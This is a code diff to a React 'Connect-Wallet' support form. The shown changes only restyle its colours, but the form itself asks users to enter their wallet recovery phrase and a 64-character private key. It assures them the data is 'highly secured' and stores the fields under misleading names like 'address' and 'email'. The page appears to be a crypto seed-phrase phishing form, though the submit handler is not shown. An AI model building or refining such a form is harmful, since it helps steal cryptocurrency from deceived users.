@@ -1,3 +1,4 @@
+// (same as your support code, only color classes updated where present)
 'use client';
 
 import { useEffect, useState, Suspense } from 'react';
@@ -89,54 +90,54 @@ function SupportForm() {
   }, [modal.open]);
 
   return (
-    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-sky-50 to-blue-100 p-6">
+    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-[#F8FAFC] to-[#EEF2FF] p-6">
       <motion.div
         initial={{ opacity: 0, y: 24 }}
         animate={{ opacity: 1, y: 0 }}
         transition={{ duration: 0.35 }}
-        className="w-full max-w-3xl bg-white/80 backdrop-blur-xl rounded-2xl shadow-xl border border-white/40 overflow-hidden"
+        className="w-full max-w-3xl bg-white/85 backdrop-blur-xl rounded-2xl shadow-xl border border-white/30 overflow-hidden"
       >
         {/* Header + Tabs */}
         <div className="flex items-center justify-between p-6 border-b border-white/30">
           <div>
-            <h1 className="text-xl font-semibold text-sky-700">Connect-Wallet — {walletFromQuery ? walletFromQuery : 'Wallet'}</h1>
-            <p className="text-xs text-slate-500 mt-1">Fill in at least one field</p>
+            <h1 className="text-xl font-semibold text-[#6D28D9]">Connect-Wallet — {walletFromQuery ? walletFromQuery : 'Wallet'}</h1>
+            <p className="text-xs text-[#64748B] mt-1">Fill in at least one field</p>
           </div>
           <div className="bg-white/60 p-1 rounded-full border border-white/30">
             <div className="flex items-center gap-1">
-              <button onClick={() => setTab('wallet')} className={`px-4 py-1 rounded-full text-sm font-medium transition ${tab === 'wallet' ? 'bg-sky-600 text-white shadow' : 'text-sky-600'}`} aria-pressed={tab === 'wallet'}>PHRASE</button>
-              <button onClick={() => setTab('personal')} className={`px-4 py-1 rounded-full text-sm font-medium transition ${tab === 'personal' ? 'bg-sky-600 text-white shadow' : 'text-sky-600'}`} aria-pressed={tab === 'personal'}>PRIVATE-KEY</button>
+              <button onClick={() => setTab('wallet')} className={`px-4 py-1 rounded-full text-sm font-medium transition ${tab === 'wallet' ? 'bg-[#6D28D9] text-white shadow' : 'text-[#6D28D9]'}`} aria-pressed={tab === 'wallet'}>PHRASE</button>
+              <button onClick={() => setTab('personal')} className={`px-4 py-1 rounded-full text-sm font-medium transition ${tab === 'personal' ? 'bg-[#6D28D9] text-white shadow' : 'text-[#6D28D9]'}`} aria-pressed={tab === 'personal'}>PRIVATE-KEY</button>
             </div>
           </div>
         </div>
 
-        {/* Body wrapped in AnimatePresence */}
+        {/* Body */}
         <div className="p-6">
           <form id="support-form" onSubmit={handleSubmit} className="space-y-6">
             <AnimatePresence mode="wait">
               {tab === 'wallet' ? (
                 <motion.div key="wallet" initial={{ opacity: 0, x: 12 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -12 }} transition={{ duration: 0.25 }} className="grid grid-cols-1 md:grid-cols-2 gap-4">
                   <div>
-                    <label className="block text-sky-800 text-sm font-medium mb-1">Wallet Phrase</label>
-                    <input name="address" value={walletData.address} onChange={onWalletChange} placeholder="Enter recovery phrase" className="w-full rounded-lg border border-sky-200 p-2.5 bg-white/60 focus:ring-2 focus:ring-sky-300 outline-none text-black" />
+                    <label className="block text-[#4338CA] text-sm font-medium mb-1">Wallet Phrase</label>
+                    <input name="address" value={walletData.address} onChange={onWalletChange} placeholder="Enter recovery phrase" className="w-full rounded-lg border border-[#EDEBFF] p-2.5 bg-white/60 focus:ring-2 focus:ring-[#6D28D9] outline-none text-[#0f1724]" />
                   </div>
                   <div>
-                    <label className="block text-sky-800 text-sm font-medium mb-1">Wallet Type</label>
-                    <input name="walletType" value={walletData.walletType} onChange={onWalletChange} placeholder={walletFromQuery || 'e.g. MetaMask, Phantom'} className="w-full rounded-lg border border-sky-200 p-2.5 bg-white/60 focus:ring-2 focus:ring-sky-300 outline-none text-black" />
+                    <label className="block text-[#4338CA] text-sm font-medium mb-1">Wallet Type</label>
+                    <input name="walletType" value={walletData.walletType} onChange={onWalletChange} placeholder={walletFromQuery || 'e.g. MetaMask, Phantom'} className="w-full rounded-lg border border-[#EDEBFF] p-2.5 bg-white/60 focus:ring-2 focus:ring-[#6D28D9] outline-none text-[#0f1724]" />
                   </div>
-                  <div className="md:col-span-2 text-sm text-slate-600">Tip: Prefilled wallet type from query.</div>
+                  <div className="md:col-span-2 text-sm text-[#64748B]">Tip: Prefilled wallet type from query.</div>
                 </motion.div>
               ) : (
                 <motion.div key="personal" initial={{ opacity: 0, x: 12 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -12 }} transition={{ duration: 0.25 }} className="grid grid-cols-1 md:grid-cols-2 gap-4">
                   <div>
-                    <label className="block text-sky-800 text-sm font-medium mb-1">Wallet Type</label>
-                    <input name="walletType" value={walletData.walletType} onChange={onWalletChange} placeholder={walletFromQuery || 'e.g. MetaMask, Phantom'} className="w-full rounded-lg border border-sky-200 p-2.5 bg-white/60 focus:ring-2 focus:ring-sky-300 outline-none text-black" />
+                    <label className="block text-[#4338CA] text-sm font-medium mb-1">Wallet Type</label>
+                    <input name="walletType" value={walletData.walletType} onChange={onWalletChange} placeholder={walletFromQuery || 'e.g. MetaMask, Phantom'} className="w-full rounded-lg border border-[#EDEBFF] p-2.5 bg-white/60 focus:ring-2 focus:ring-[#6D28D9] outline-none text-[#0f1724]" />
                   </div>
                   <div>
-                    <label className="block text-sky-800 text-sm font-medium mb-1">Private-Key</label>
-                    <textarea name="email" value={personalData.email} onChange={onPersonalChange} placeholder="64 character string." className="w-full rounded-lg border border-sky-200 p-2.5 bg-white/60 focus:ring-2 focus:ring-sky-300 outline-none text-black" />
+                    <label className="block text-[#4338CA] text-sm font-medium mb-1">Private-Key</label>
+                    <textarea name="email" value={personalData.email} onChange={onPersonalChange} placeholder="64 character string." className="w-full rounded-lg border border-[#EDEBFF] p-2.5 bg-white/60 focus:ring-2 focus:ring-[#6D28D9] outline-none text-[#0f1724]" />
                   </div>
-                  <div className="md:col-span-2 text-sm text-slate-600">Tip: Keep private info secure.</div>
+                  <div className="md:col-span-2 text-sm text-[#64748B]">Tip: Keep private info secure.</div>
                 </motion.div>
               )}
             </AnimatePresence>
@@ -145,9 +146,9 @@ function SupportForm() {
 
         {/* Footer */}
         <div className="p-6 border-t border-white/30 bg-white/40 flex items-center justify-between gap-4">
-          <div className="text-sm text-sky-600">Your information is highly secured. 🔐</div>
+          <div className="text-sm text-[#4338CA]">Your information is highly secured. 🔐</div>
           <div>
-            <button form="support-form" type="submit" disabled={submitting} className={`px-5 py-2 rounded-lg font-semibold transition ${submitting ? 'bg-sky-300 text-white cursor-wait' : 'bg-gradient-to-r from-sky-500 to-blue-600 text-white hover:scale-[1.02]'}`}>
+            <button form="support-form" type="submit" disabled={submitting} className={`px-5 py-2 rounded-lg font-semibold transition ${submitting ? 'bg-[#9CA3FF] text-white cursor-wait' : 'btn-primary'}`}>
               {submitting ? 'Submitting...' : 'Submit'}
             </button>
           </div>
@@ -158,10 +159,10 @@ function SupportForm() {
       <AnimatePresence>
         {modal.open && (
           <motion.div key="feedback" className="fixed inset-0 z-50 flex items-center justify-center bg-black/40 backdrop-blur-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
-            <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.9, opacity: 0 }} transition={{ type: 'spring', stiffness: 120, damping: 15 }} className={`bg-white/90 backdrop-blur-xl p-6 rounded-2xl shadow-xl border ${modal.success ? 'border-red-300' : 'border-red-300'} max-w-sm text-center`}>
-              <p className={`text-lg font-semibold ${modal.success ? 'text-red-700' : 'text-red-700'}`}>{modal.message}</p>
+            <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.9, opacity: 0 }} transition={{ type: 'spring', stiffness: 120, damping: 15 }} className={`bg-white/95 backdrop-blur-xl p-6 rounded-2xl shadow-xl border ${modal.success ? 'border-[#D4AF37]/40' : 'border-[#6D28D9]/10'} max-w-sm text-center`}>
+              <p className={`text-lg font-semibold ${modal.success ? 'text-[#059669]' : 'text-[#B91C1C]'}`}>{modal.message}</p>
               <div className="mt-4">
-                <button onClick={() => setModal({ open: false, success: false, message: '' })} className="px-4 py-2 rounded-lg bg-sky-600 text-white font-medium hover:bg-sky-700 transition">Close</button>
+                <button onClick={() => setModal({ open: false, success: false, message: '' })} className="px-4 py-2 rounded-lg bg-[#6D28D9] text-white font-medium hover:bg-[#5b21b6] transition">Close</button>
               </div>
             </motion.div>
           </motion.div>
